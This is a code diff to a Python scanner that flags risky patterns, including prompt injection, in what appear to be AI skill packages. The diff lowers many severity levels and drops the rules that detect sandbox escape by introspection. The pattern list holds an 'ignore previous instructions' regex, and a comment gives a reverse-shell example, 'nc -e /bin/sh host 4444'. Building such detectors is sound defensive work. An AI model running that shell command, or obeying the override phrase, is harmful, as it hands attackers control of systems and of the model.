@@ -15,26 +15,24 @@ BINARY_RISK_EXTENSIONS = {
     ".egg",  # Python egg package (ZIP archive)
 }
 
-# Pattern definitions: (category, severity, regex_pattern, description, multiline)
-# multiline=True means the pattern benefits from sliding-window multi-line scanning
-# (e.g. constructs commonly split across lines). Per-line scan always runs for all.
+# Pattern definitions: (category, severity, regex_pattern, description)
 PATTERNS = [
     # Network access
     (
         "network",
-        "medium",
+        "low",
         r"\b(urllib|requests|httpx|aiohttp|http\.client)\b",
         "Uses HTTP networking library",
     ),
     (
         "network",
-        "medium",
+        "low",
         r"\bfrom\s+http\s+import\s+client\b",
         "Uses HTTP networking library (from http import client)",
     ),
     (
         "network",
-        "medium",
+        "low",
         r"\b(fetch|XMLHttpRequest|axios)\s*\(",
         "Makes HTTP requests (JS)",
     ),
@@ -46,7 +44,7 @@ PATTERNS = [
     ),
     (
         "network",
-        "medium",
+        "low",
         r"(?:subprocess|os\.system|os\.popen)\s*\(.*\b(curl|wget)\b",
         "Executes curl/wget via shell command",
     ),
@@ -101,7 +99,7 @@ PATTERNS = [
     ),
     (
         "credentials",
-        "medium",
+        "low",
         r"(?i)\b(password|passwd|secret|api_key|apikey|token|auth_token)\s*[=:]",
         "Assigns sensitive value (password/secret/token)",
     ),
@@ -114,7 +112,7 @@ PATTERNS = [
     # Shell execution
     (
         "shell",
-        "high",
+        "medium",
         r"\bsubprocess\.(run|call|Popen|check_output|check_call|getoutput|getstatusoutput)\b",
         "Executes system commands via subprocess",
     ),
@@ -128,7 +126,7 @@ PATTERNS = [
         "shell",
         "high",
         r"(?<![.\w])\b(exec|eval)\s*\(",
-        "Dynamic code evaluation via built-in functions",
+        "Uses exec() or eval() — dynamic code execution",
     ),
     (
         "shell",
@@ -169,7 +167,7 @@ PATTERNS = [
     ),
     (
         "file_access",
-        "medium",
+        "low",
         r'(?:open|read|write)\s*\(\s*["\']/',
         "Accesses absolute file path",
     ),
@@ -201,7 +199,7 @@ PATTERNS = [
     # Obfuscation
     (
         "obfuscation",
-        "medium",
+        "low",
         r"[A-Za-z0-9+/=]{100,}",
         "Contains long base64-encoded string",
     ),
@@ -213,13 +211,13 @@ PATTERNS = [
     ),
     (
         "obfuscation",
-        "medium",
+        "low",
         r"__import__\s*\(",
         "Uses dynamic import (__import__)",
     ),
     (
         "obfuscation",
-        "medium",
+        "low",
         r"\bimportlib\.import_module\s*\(",
         "Uses dynamic import (importlib)",
     ),
@@ -285,7 +283,7 @@ PATTERNS = [
         "prompt_injection",
         "critical",
         r"(?i)(ignore\s+(previous|prior|above)\s+(instructions?|prompts?))",
-        "Prompt injection: instruction override attempt",
+        "Prompt injection: ignore previous instructions",
     ),
     (
         "prompt_injection",
@@ -328,20 +326,6 @@ PATTERNS = [
         r"(?i)(n[aã]o\s+revel[ea]|no\s+reveles|ne\s+r[eé]v[eè]le[z]?\s+pas|enth[uü]lle\s+(das\s+)?nicht|nunca\s+mencione[s]?|ne\s+mentionnez?\s+jamais)",
         "Prompt injection: hide behavior (PT/ES/FR/DE)",
     ),
-    # Sandbox escape via class introspection (H4 fix)
-    (
-        "obfuscation",
-        "high",
-        r"__(?:subclasses|mro|bases|globals|builtins)__",
-        "Class introspection chain — potential sandbox escape",
-    ),
-    # getattr-based obfuscation (H5 fix)
-    (
-        "obfuscation",
-        "high",
-        r"\bgetattr\s*\(\s*__import__",
-        "Uses getattr with dynamic import — obfuscated function call",
-    ),
     # Environment manipulation
     (
         "environment",
@@ -353,7 +337,7 @@ PATTERNS = [
         "environment",
         "low",
         r"\bos\.environ\.get\s*\(|\bos\.getenv\s*\(",
-        "Reads environment variables (potential secret access)",
+        "Reads environment variables (may exfiltrate secrets)",
     ),
     (
         "environment",
@@ -363,39 +347,30 @@ PATTERNS = [
     ),
     (
         "environment",
-        "high",
+        "medium",
         r"\bsys\.path\.(insert|append)\s*\(",
         "Manipulates Python import path (potential hijacking)",
     ),
 ]
 
 # Sliding window size for multi-line pattern detection.
-# scan_content() joins N consecutive lines with a space and runs only multiline-tagged
-# patterns against each window, catching constructs split across lines to evade
-# per-line scanning (M4 optimization — avoid quadratic work for single-line patterns).
+# scan_content() joins N consecutive lines with a space and runs all patterns
+# against each window, catching constructs split across lines to evade per-line scanning.
+# Example: cmd = "nc "; cmd += "-e /bin/sh host 4444"; os.system(cmd)
 MULTILINE_WINDOW_SIZE = 3
-
-# Categories whose patterns benefit from multi-line sliding window detection.
-# These are patterns where attackers commonly split constructs across lines
-# (e.g. reverse shell via string concatenation, obfuscated exec chains).
-MULTILINE_CATEGORIES = {"reverse_shell", "obfuscation", "shell", "credentials"}
 
 # Compiled patterns (lazy init)
 _compiled = None
-_compiled_multiline = None
 
 
 def _compile_patterns():
-    global _compiled, _compiled_multiline
+    global _compiled
     if _compiled is None:
         _compiled = []
-        _compiled_multiline = []
         for category, severity, pattern, description in PATTERNS:
             try:
                 compiled = re.compile(pattern)
                 _compiled.append((category, severity, compiled, description))
-                if category in MULTILINE_CATEGORIES:
-                    _compiled_multiline.append((category, severity, compiled, description))
             except re.error as e:
                 print(f"Warning: failed to compile pattern '{pattern}': {e}", file=sys.stderr)
                 continue
@@ -406,10 +381,9 @@ def scan_content(content: str, file_path: str) -> list:
     """Scan a single file's content for suspicious patterns.
 
     Uses two passes:
-    1. Per-line: standard line-by-line pattern matching (all patterns).
-    2. Sliding window: N consecutive lines joined with a space, running only
-       multiline-tagged patterns to catch constructs split across lines
-       (e.g. reverse shell built via string concatenation).
+    1. Per-line: standard line-by-line pattern matching.
+    2. Sliding window: N consecutive lines joined with a space, catching constructs
+       split across lines (e.g. reverse shell built via string concatenation).
 
     Deduplication by (category, description, file) is handled by scan_skill().
 
@@ -421,7 +395,7 @@ def scan_content(content: str, file_path: str) -> list:
 
     lines = content.split("\n")
 
-    # Pass 1 — per-line scan (all patterns)
+    # Pass 1 — per-line scan
     for line_num, line in enumerate(lines, start=1):
         for category, severity, compiled, description in patterns:
             if compiled.search(line):
@@ -435,22 +409,21 @@ def scan_content(content: str, file_path: str) -> list:
                     }
                 )
 
-    # Pass 2 — sliding window (only multiline-relevant patterns, M4 optimization)
-    if _compiled_multiline:
-        for start in range(len(lines) - MULTILINE_WINDOW_SIZE + 1):
-            window = " ".join(lines[start : start + MULTILINE_WINDOW_SIZE])
-            line_num = start + 1  # report first line of the window
-            for category, severity, compiled, description in _compiled_multiline:
-                if compiled.search(window):
-                    findings.append(
-                        {
-                            "severity": severity,
-                            "category": category,
-                            "description": description,
-                            "file": file_path,
-                            "line": line_num,
-                        }
-                    )
+    # Pass 2 — sliding window (catches multi-line evasion)
+    for start in range(len(lines) - MULTILINE_WINDOW_SIZE + 1):
+        window = " ".join(lines[start : start + MULTILINE_WINDOW_SIZE])
+        line_num = start + 1  # report first line of the window
+        for category, severity, compiled, description in patterns:
+            if compiled.search(window):
+                findings.append(
+                    {
+                        "severity": severity,
+                        "category": category,
+                        "description": description,
+                        "file": file_path,
+                        "line": line_num,
+                    }
+                )
 
     return findings
 
